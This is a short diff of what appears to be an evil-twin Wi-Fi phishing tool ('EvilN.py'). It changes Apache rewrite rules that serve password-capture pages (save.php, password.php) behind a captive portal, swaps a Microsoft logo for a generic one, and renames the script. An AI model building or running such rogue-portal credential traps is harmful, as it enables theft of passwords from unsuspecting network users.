@@ -528,7 +528,7 @@ def create_vhost_migdal_dual():
 
     RewriteEngine On
     RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
-    RewriteRule ^/?(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L]
+    RewriteRule ^/?(save\.php|password\.php|save2\.php|logo\.svg)$ - [L]
     RewriteCond %{REQUEST_FILENAME} -f [OR]
     RewriteCond %{REQUEST_FILENAME} -d
     RewriteRule ^ - [L]
@@ -575,7 +575,7 @@ def create_vhost_migdal():
 
     RewriteEngine On
     RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
-    RewriteRule ^/?(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L]
+    RewriteRule ^/?(save\.php|password\.php|save2\.php|logo\.svg)$ - [L]
     RewriteCond %{REQUEST_FILENAME} -f [OR]
     RewriteCond %{REQUEST_FILENAME} -d
     RewriteRule ^ - [L]
@@ -1058,7 +1058,7 @@ def cleanup(signum, frame):
 #########################################################
 
 def parse_args():
-    p = argparse.ArgumentParser(prog="EvilN.py", description="Just be nice to your neighbors")
+    p = argparse.ArgumentParser(prog="EvilN-new2.0.py", description="Just be nice to your neighbors")
     sub = p.add_subparsers(dest="mode", required=True)
 
     single = sub.add_parser("single", help="choose one single band 2.4GHz or 5GHz")
